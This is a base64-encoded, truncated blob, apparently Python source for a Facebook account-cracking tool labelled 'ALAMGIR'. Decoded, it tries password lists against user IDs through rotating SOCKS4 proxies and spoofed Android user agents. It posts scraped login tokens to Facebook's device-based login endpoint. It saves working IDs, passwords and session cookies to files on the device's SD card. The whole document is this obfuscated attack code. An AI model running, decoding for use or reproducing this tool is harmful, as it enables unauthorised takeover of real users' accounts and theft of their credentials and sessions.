jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pCiAgICAgICAgICAgICAgICAgICAgY29raTEgPSBjb2tpLnNwbGl0KCIxMDAwIilbMV0KICAgICAgICAgICAgICAgICAgICBpZGYgPSAiMTAwMCIrY29raTFbMDoxMV0KICAgICAgICAgICAgICAgICAgICBwcmludChmJ1wwMzNbMTszMW1bQUxBTUdJUi1DUF0ge2lkZn18e3BzfScpCiAgICAgICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9BTEFNR0lSLUNQLnR4dCcsJ2EnKS53cml0ZShpZGYrJ3wnK3BzKydcbicpCiAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKGlkZikKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICBsb29wKz0xCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwpkZWYgbWV0Myh1aWQscHNzLHRvdGFsKToKICAgIGdsb2JhbCBvawogICAgZ2xvYmFsIGxvb3AKICAgIGdsb2JhbCBjcAogICAgdHJ5OgogICAgICAgIGZvciBwcyBpbiBwc3M6CiAgICAgICAgICAgIHNlc3Npb24gPSByZXF1ZXN0cy5TZXNzaW9uKCkKICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyXDAzM1sxOzM3bVtcMDMzWzE7MzJtQUxBTUdJUi1NM1wwMzNbMTszN21dXDAzM1sxOzMxbVtcMDMzWzE7MzNte2xvb3B9L3t0b3RhbH1cMDMzWzE7MzBtXSBcMDMzWzE7OTBtW1wwMzNbMTszMm1PS1wwMzNbMTszMG1dXDAzM1sxOzM3bS1cMDMzWzE7MzJte2xlbihvayl9XHInKQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICAgICAgbW9kZWxzID0gcmFuZG9tLmNob2ljZShbJ1NNLUoxMDBGJywgJ1NNLUoxMDBGTicsICdTTS1KMTAwSCcsICdTTS1KMTAwSC9ERCcsICdTTS1KMTAwSCcsICdTTS1KMTAwTScsICdTTS1KMTAwTVUnLCAnU00tSjEwME1MJywgJ1NNLUoxMDBWUFAnLCAnU00tSjEwMFknLCAnU00tSjExMUYnLCAnU00tSjExMEcnLCAnU00tSjExMEYnLCAnU00tSjExMEgnLCAnU00tSjExME0nLCAnU00tSjExMEwnLCAnU00tSjExMU0nLCAnU00tTTUyNkJSJywgJ1NNLU01MjZCUi9EUycsICdTTS1NNTI2QicsICdTTS1NNTI2Qi9EUycsICdTTS1BMzI2QicsICdTTS1BMzI2Qi9EUycsICdTTS1BMzI2QlIvRFMnLCAnU00tQTMyNkJSJywgJ1NNLUEzMjZVJywgJ1NNLUEzMjZXJywgJ1NNLUEzMjZVMScsICdTTS1BMzI2SycsICdTQ0cwOCcsICdTTS1TMzI2REwnLCAnVjIwMjcnLCAnVjIwMzInLCAnUk1YMjAyNycsICdSTVgyMDIwJywgJ1JNWDIwMjEnLCAnQ1BIMTk2OScsICdDUEgyMjA5JywgJ0NQSDE5ODcnXSkKICAgICAgICAgICAgdWEgPSByYW5kb20uY2hvaWNlKHVnZW4pCiAgICAgICAgICAgIHJyID0gcmFuZG9tLnJhbmRpbnQKICAgICAgICAgICAgcmMgPSByYW5kb20uY2hvaWNlCiAgICAgICAgICAgIG5pcD1yYW5kb20uY2hvaWNlKHByb3gpCiAgICAgICAgICAgIHByb3hzID0geydodHRwJzogJ3NvY2tzNDovLycrbmlwfQogICAgICAgICAgICBzZXNzaW9uLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6ICJtLmZhY2Vib29rLmNvbSIsImNhY2hlLWNvbnRyb2wiOiAibWF4LWFnZT0wIiwidXNlci1hZ2VudCI6IHVhLCJhY2NlcHQiOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43Iiwic2VjLWNoLXVhIjogJyIgTm90IEE7QnJhbmQiO3Y9Ijk5IiwgIkNocm9taXVtIjt2PSIxMTQiJywic2VjLWNoLXVhLW1vYmlsZSI6ICI/MCIsInNlYy1mZXRjaC1zaXRlIjogInNhbWUtb3JpZ2luIiwic2VjLWZldGNoLW1vZGUiOiAiY29ycyIsInNlYy1mZXRjaC1kZXN0IjogImVtcHR5Iiwic2VjLWZldGNoLXVzZXIiOiAiPzEiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCJhY2NlcHQtbGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcifSkKICAgICAgICAgICAgbGluayA9IHNlc3Npb24uZ2V0KCdodHRwczovL20uZmFjZWJvb2suY29tL2xvZ2luLnBocD9za2lwX2FwaV9sb2dpbj0xJmFwaV9rZXk9MzIxMzgwNDc2MjE4OTg0NSZraWRfZGlyZWN0ZWRfc2l0ZT0wJmFwcF9pZD0zMjEzODA0NzYyMTg5ODQ1JnNpZ25lZF9uZXh0PTEmbmV4dD1odHRwcyUzQSUyRiUyRm0uZmFjZWJvb2suY29tJTJGdjMuMSUyRmRpYWxvZyUyRm9hdXRoJTNGY2xpZW50X2lkJTNEMzIxMzgwNDc2MjE4OTg0NSUyNnJlZGlyZWN0X3VyaSUzRGh0dHBzJTI1M0ElMjUyRiUyNTJGd3d3LmNhcGN1dC5jb20lMjUyRnBhc3Nwb3J0JTI1MkZ3ZWIlMjUyRndlYl9sb2dpbl9zdWNjZXNzJTI2c2NvcGUlM0RlbWFpbCUyNnN0YXRlJTNEM2M3NjExODEzZ0FUb1ZDZ29WUFpJREEyWkdWbE5XVTRZalV3WkRobU56Y3dPVE00TkRRNU5UWTRNek5qTVRFM29VN1pPbWgwZEhCek9pOHZkM2QzTG1OaGNHTjFkQzVqYjIwdmJIWXZkakV2ZFhObGNpOTNaV0l2Ykc5bmFXNHZkR2hwY21SZlkyRnNiR0poWTJ1aFZnR2hTUUNoUkFDaFFkSUFCVkFjb1UwQW9VaXVkM2QzTG1OaGNHTjFkQzVqYjIyaFVnS2lVRXpSQnV5bVFVTlVTVTlPcVhWdVpHVm1hVzVsWktGTTJTSm9kSFJ3Y3pvdkwzZDNkeTVqWVhCamRYUXVZMjl0TDJsa0xXbGtMMnh2WjJsdW9WVFpJR0UyT1dNNU1XTTJZamRpT0dGbU5XTXlOREk0WkdSak9ESmxNR1JrTlRZMG9WY0FvVVlBb2xOQkFLRlZ3cUpOVE1JJTI1MjUzRCUyNnJldCUzRGxvZ2luJTI2ZmJhcHBfcHJlcyUzRDAlMjZsb2dnZXJfaWQlM0QxNDJlZDU2MS1lNWM4LTQ5YTQtYmVjNC1lYWE0NWJhZTY3ZjAlMjZ0cCUzRHVuc3BlY2lmaWVkJmNhbmNlbF91cmw9aHR0cHMlM0ElMkYlMkZ3d3cuY2FwY3V0LmNvbSUyRnBhc3Nwb3J0JTJGd2ViJTJGd2ViX2xvZ2luX3N1Y2Nlc3MlM0ZlcnJvciUzRGFjY2Vzc19kZW5pZWQlMjZlcnJvcl9jb2RlJTNEMjAwJTI2ZXJyb3JfZGVzY3JpcHRpb24lM0RQZXJtaXNzaW9ucyUyQmVycm9yJTI2ZXJyb3JfcmVhc29uJTNEdXNlcl9kZW5pZWQlMjZzdGF0ZSUzRDNjNzYxMTgxM2dBVG9WQ2dvVlBaSURBMlpHVmxOV1U0WWpVd1pEaG1OemN3T1RNNE5EUTVOVFk0TXpOak1URTNvVTdaT21oMGRIQnpPaTh2ZDNkM0xtTmhjR04xZEM1amIyMHZiSFl2ZGpFdmRYTmxjaTkzWldJdmJHOW5hVzR2ZEdocGNtUmZZMkZzYkdKaFkydWhWZ0doU1FDaFJBQ2hRZElBQlZBY29VMEFvVWl1ZDNkM0xtTmhjR04xZEM1amIyMmhVZ0tpVUV6UkJ1eW1RVU5VU1U5T3FYVnVaR1ZtYVc1bFpLRk0yU0pvZEhSd2N6b3ZMM2QzZHk1allYQmpkWFF1WTI5dEwybGtMV2xrTDJ4dloybHVvVlRaSUdFMk9XTTVNV00yWWpkaU9HRm1OV015TkRJNFpHUmpPREpsTUdSa05UWTBvVmNBb1VZQW9sTkJBS0ZWd3FKTlRNSSUyNTI1M0QlMjNfJTNEXyZkaXNwbGF5PXRvdWNoJmxvY2FsZT1pZF9JRCZwbF9kYmw9MCZyZWZzcmM9ZGVwcmVjYXRlZCZfcmRyJykKICAgICAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgJ2xzZCc6IHJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJyxzdHIobGluay50ZXh0KSkuZ3JvdXAoMSksCiAgICAgICAgICAgICdqYXpvZXN0JzogcmUuc2VhcmNoKCduYW1lPSJqYXpvZXN0IiB2YWx1ZT0iKC4qPykiJyxzdHIobGluay50ZXh0KSkuZ3JvdXAoMSksCiAgICAgICAgICAgICdtX3RzJzogcmUuc2VhcmNoKCduYW1lPSJtX3RzIiB2YWx1ZT0iKC4qPykiJyxzdHIobGluay50ZXh0KSkuZ3JvdXAoMSksCiAgICAgICAgICAgICdsaSc6IHJlLnNlYXJjaCgnbmFtZT0ibGkiIHZhbHVlPSIoLio/KSInLHN0cihsaW5rLnRleHQpKS5ncm91cCgxKSwKICAgICAgICAgICAgJ3RyeV9udW1iZXInOiByZS5zZWFyY2goJ25hbWU9InRyeV9udW1iZXIiIHZhbHVlPSIoLio/KSInLHN0cihsaW5rLnRleHQpKS5ncm91cCgxKSwKICAgICAgICAgICAgJ3VucmVjb2duaXplZF90cmllcyc6IHJlLnNlYXJjaCgnbmFtZT0idW5yZWNvZ25pemVkX3RyaWVzIiB2YWx1ZT0iKC4qPykiJyxzdHIobGluay50ZXh0KSkuZ3JvdXAoMSksCiAgICAgICAgICAgICdiaV94cndoJzogcmUuc2VhcmNoKCduYW1lPSJiaV94cndoIiB2YWx1ZT0iKC4qPykiJyxzdHIobGluay50ZXh0KSkuZ3JvdXAoMSksCiAgICAgICAgICAgICdfZmJfbm9zY3JpcHQnOiAndHJ1ZScsCiAgICAgICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAgICAgJ3Bhc3MnOiBwcywKICAgICAgICAgICAgJ2xvZ2luJzogJ01hc3VrJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGhlYWQgPSB7CiAgICAgICAgICAgICdIb3N0JzogJ3AuZmFjZWJvb2suY29tJywKICAgICAgICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcnLAogICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsCiAgICAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLAogICAgIyAnY29va2llJzogJ2RhdHI9V0JfMlpSWkMxUHBZbEZOMzlxRzA1MmYtOyBzYj1XQl8yWmVJR05VaUF6RDNrcC1HVnNkSUU7IGxvY2FsZT1lbl9VUzsgcHNfbD0wOyBwc19uPTA7IHZwZD12MSUzQjY0OHgzNjB4Mjsgd2xfY2J2PXYyJTNCY2xpZW50X3ZlcnNpb24lM0EyNDM3JTNCdGltZXN0YW1wJTNBMTcxMDY1OTgxMDsgbV9waXhlbF9yYXRpbz0yOyB3ZD0zNjB4NjQ4OyBmcj0wbFRLNmlyUlhaN2tJTFdDRi5BV1hNZWdMbjREcEpSX1BGR3R1U3Z6VTNoSGsuQmw5aDlZLi5BQUEuMC4wLkJsLUlIVC5BV1htZTN5US1JUScsCiAgICAnZHByJzogJzInLAogICAgJ3NlYy1jaC1wcmVmZXJzLWNvbG9yLXNjaGVtZSc6ICdkYXJrJywKICAgICdzZWMtY2gtdWEnOiAnIk5vdC1BLkJyYW5kIjt2PSI5OSIsICJDaHJvbWl1bSI7dj0iMTI0IicsCiAgICAnc2VjLWNoLXVhLWZ1bGwtdmVyc2lvbi1saXN0JzogJyJOb3QtQS5CcmFuZCI7dj0iOTkuMC4wLjAiLCAiQ2hyb21pdW0iO3Y9IjEyNC4wLjYzMjcuMSInLAogICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzEnLAogICAgJ3NlYy1jaC11YS1tb2RlbCc6ICciUk1YMzUwMSInLAogICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciQW5kcm9pZCInLAogICAgJ3NlYy1jaC11YS1wbGF0Zm9ybS12ZXJzaW9uJzogJyIxMy4wLjAiJywKICAgICdzZWMtZmV0Y2gtZGVzdCc6ICdkb2N1bWVudCcsCiAgICAnc2VjLWZldGNoLW1vZGUnOiAnbmF2aWdhdGUnLAogICAgJ3NlYy1mZXRjaC1zaXRlJzogJ25vbmUnLAogICAgJ3NlYy1mZXRjaC11c2VyJzogJz8xJywKICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLAogICAgJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICd2aWV3cG9ydC13aWR0aCc6ICc5ODAnLH0KICAgICAgICAgICAgcGFyYW1zID0gewogICAgICAgICAgICAnYXBpX2tleSc6ICczMjEzODA0NzYyMTg5ODQ1JywKICAgICAgICAgICAgJ2F1dGhfdG9rZW4nOiAnODZlZTkwODE1NjdhM2FlNTljZmVkZDg4N2E2ODVhY2EnLAogICAgICAgICAgICAnc2tpcF9hcGlfbG9naW4nOiAnMScsCiAgICAgICAgICAgICdzaWduZWRfbmV4dCc6ICcxJywKICAgICAgICAgICAgJ25leHQnOiAnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3YzLjEvZGlhbG9nL29hdXRoP2NsaWVudF9pZD0zMjEzODA0NzYyMTg5ODQ1JnJlZGlyZWN0X3VyaT1odHRwcyUzQSUyRiUyRnd3dy5jYXBjdXQuY29tJTJGcGFzc3BvcnQlMkZ3ZWIlMkZ3ZWJfbG9naW5fc3VjY2VzcyZzY29wZT1lbWFpbCZzdGF0ZT0zYzc2MTE4MTNnQVRvVkNnb1ZQWklEQTJaR1ZsTldVNFlqVXdaRGhtTnpjd09UTTRORFE1TlRZNE16TmpNVEUzb1U3Wk9taDBkSEJ6T2k4dmQzZDNMbU5oY0dOMWRDNWpiMjB2YkhZdmRqRXZkWE5sY2k5M1pXSXZiRzluYVc0dmRHaHBjbVJmWTJGc2JHSmhZMnVoVmdHaFNRQ2hSQUNoUWRJQUJWQWNvVTBBb1VpdWQzZDNMbU5oY0dOMWRDNWpiMjJoVWdLaVVFelJCdXltUVVOVVNVOU9xWFZ1WkdWbWFXNWxaS0ZNMlNKb2RIUndjem92TDNkM2R5NWpZWEJqZFhRdVkyOXRMMmxrTFdsa0wyeHZaMmx1b1ZUWklHRTJPV001TVdNMllqZGlPR0ZtTldNeU5ESTRaR1JqT0RKbE1HUmtOVFkwb1ZjQW9VWUFvbE5CQUtGVndxSk5UTUklMjUzRCZyZXQ9bG9naW4mZmJhcHBfcHJlcz0wJmxvZ2dlcl9pZD0xNDJlZDU2MS1lNWM4LTQ5YTQtYmVjNC1lYWE0NWJhZTY3ZjAmdHA9dW5zcGVjaWZpZWQnLAogICAgICAgICAgICAncmVmc3JjJzogJ2RlcHJlY2F0ZWQnLAogICAgICAgICAgICAnYXBwX2lkJzogJzMyMTM4MDQ3NjIxODk4NDUnLAogICAgICAgICAgICAnY2FuY2VsJzogJ2h0dHBzOi8vd3d3LmNhcGN1dC5jb20vcGFzc3BvcnQvd2ViL3dlYl9sb2dpbl9zdWNjZXNzP2Vycm9yPWFjY2Vzc19kZW5pZWQmZXJyb3JfY29kZT0yMDAmZXJyb3JfZGVzY3JpcHRpb249UGVybWlzc2lvbnMrZXJyb3ImZXJyb3JfcmVhc29uPXVzZXJfZGVuaWVkJnN0YXRlPTNjNzYxMTgxM2dBVG9WQ2dvVlBaSURBMlpHVmxOV1U0WWpVd1pEaG1OemN3T1RNNE5EUTVOVFk0TXpOak1URTNvVTdaT21oMGRIQnpPaTh2ZDNkM0xtTmhjR04xZEM1amIyMHZiSFl2ZGpFdmRYTmxjaTkzWldJdmJHOW5hVzR2ZEdocGNtUmZZMkZzYkdKaFkydWhWZ0doU1FDaFJBQ2hRZElBQlZBY29VMEFvVWl1ZDNkM0xtTmhjR04xZEM1amIyMmhVZ0tpVUV6UkJ1eW1RVU5VU1U5T3FYVnVaR1ZtYVc1bFpLRk0yU0pvZEhSd2N6b3ZMM2QzZHk1allYQmpkWFF1WTI5dEwybGtMV2xrTDJ4dloybHVvVlRaSUdFMk9XTTVNV00yWWpkaU9HRm1OV015TkRJNFpHUmpPREpsTUdSa05UWTBvVmNBb1VZQW9sTkJBS0ZWd3FKTlRNSSUyNTNEI189XycsCiAgICAgICAgICAgICdsd3YnOiAnMTAwJywKICAgICAgICAgICAgfQogICAgICAgICAgICBsbyA9IHNlc3Npb24ucG9zdCgnaHR0cHM6Ly9wLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvbG9naW4vYXN5bmMvP3JlZnNyYz1kZXByZWNhdGVkJmx3dj0xMDAnLHBhcmFtcz1wYXJhbXMsaGVhZGVycz1oZWFkLGRhdGE9ZGF0YSxhbGxvd19yZWRpcmVjdHM9RmFsc2UpCiAgICAgICAgICAgIGxvZ19jb29raWVzPXNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLmtleXMoKQogICAgICAgICAgICBpZiAnY191c2VyJyBpbiBsb2dfY29va2llczoKICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkKICAgICAgICAgICAgICAgIGlkZiA9IHJlLmZpbmRhbGwoJ2NfdXNlcj0oLiopO3hzJywgY29raSlbMF0KICAgICAgICAgICAgICAgIHByaW50KCdcclxyXDAzM1sxOzM3bVtcMDMzWzE7MzJtQUxJVkVcMDMzWzE7MzdtXVwwMzNbMTszN20gJyAraWRmKyAnXDAzM1sxOzMzbSB8IFwwMzNbMTszN20nICtwcysgICcnKQogICAgICAgICAgICAgICAgcHJpbnQoJ1xyXHJcMDMzWzE7MzdtW1wwMzNbMTszMm1DT09LSUVcMDMzWzE7MzdtXVwwMzNbMTszN20gJyArY29raSkKICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvQUxBTUdJUi1PSy1NMy50eHQnLCdhJykud3JpdGUoaWRmKyd8JytwcysnfCcrY29raSsnXG4nKQogICAgICAgICAgICAgICAgb2suYXBwZW5kKGlkZikKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIGxvZ19jb29raWVzOgogICAgICAgICAgICAgICAgaWYgJ3knIGluIGNweDoKICAgICAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pCiAgICAgICAgICAgICAgICAgICAgY29raTEgPSBjb2tpLnNwbGl0KCIxMDAwIilbMV0KICAgICAgICAgICAgICAgICAgICBpZGYgPSAiMTAwMCIrY29raTFbMDoxMV0KICAgICAgICAgICAgICAgICAgICBwcmludChmJ1wwMzNbMTszMW1bQUxBTUdJUi1DUF0ge2lkZn18e3BzfScpCiAgICAgICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9BTEFNR0lSLUNQLnR4dCcsJ2EnKS53cml0ZShpZGYrJ3wnK3BzKydcbicpCiAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKGlkZikKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICBsb29wKz0xCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwptYWluKCkK'))